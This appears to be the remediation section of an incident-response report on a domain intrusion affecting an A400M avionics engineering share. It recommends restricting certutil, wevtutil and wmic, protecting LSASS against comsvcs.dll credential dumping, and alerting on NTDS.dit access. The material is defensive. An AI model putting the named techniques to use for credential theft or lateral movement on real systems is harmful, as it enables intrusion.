- **Review Defender policy on SRV-DC01** — `MsMpEng.exe` scanned `ntds.dit` but took no action. Review Defender configuration for the Domain Controller; NTDS.dit outside its standard path should trigger an alert
- **Restrict LOLBin usage** — implement AppLocker or WDAC policies to restrict `certutil.exe`, `wevtutil.exe`, and `wmic.exe` to authorised administrative use only
- **Audit A400M programme access** — identify all personnel with access to `C:\Engineering\Avionics\A400M_NavSys` and assess whether additional data copies exist elsewhere in the environment
- **Implement network segmentation** — the engineering segment should not have direct WMI/RDP connectivity between workstations and the Domain Controller. Restrict lateral movement paths at the network level.
- **Enable LSASS protection (PPL)** — enable Protected Process Light for LSASS on all hosts to prevent credential dumping via `comsvcs.dll` and similar techniques

---

